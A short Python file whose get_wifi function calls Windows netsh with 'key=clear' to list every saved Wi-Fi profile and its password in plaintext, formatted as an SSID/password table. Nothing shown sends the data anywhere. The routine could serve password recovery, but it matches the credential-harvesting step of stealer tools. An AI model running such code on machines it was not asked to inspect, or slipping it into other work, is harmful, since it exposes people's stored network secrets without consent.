import subprocess
import os
import ctypes

def get_wifi():
  networks, out = [], ''
  try:
      wifi = subprocess.check_output(
          ['netsh', 'wlan', 'show', 'profiles'], shell=True,
          stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
      wifi = [i.split(":")[1][1:-1]
              for i in wifi if "All User Profile" in i]

      for name in wifi:
          try:
              results = subprocess.check_output(
                  ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                  stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
              results = [b.split(":")[1][1:-1]
                          for b in results if "Key Content" in b]
          except subprocess.CalledProcessError:
              networks.append((name, ''))
              continue

          try:
              networks.append((name, results[0]))
          except IndexError:
              networks.append((name, ''))

  except subprocess.CalledProcessError:
      pass
  except UnicodeDecodeError:
      pass

  out += f'{"SSID":<20}| {"PASSWORD":<}\n'
  out += f'{"-"*20}|{"-"*29}\n'
  for name, password in networks:
      out += '{:<20}| {:<}\n'.format(name, password)

  return out
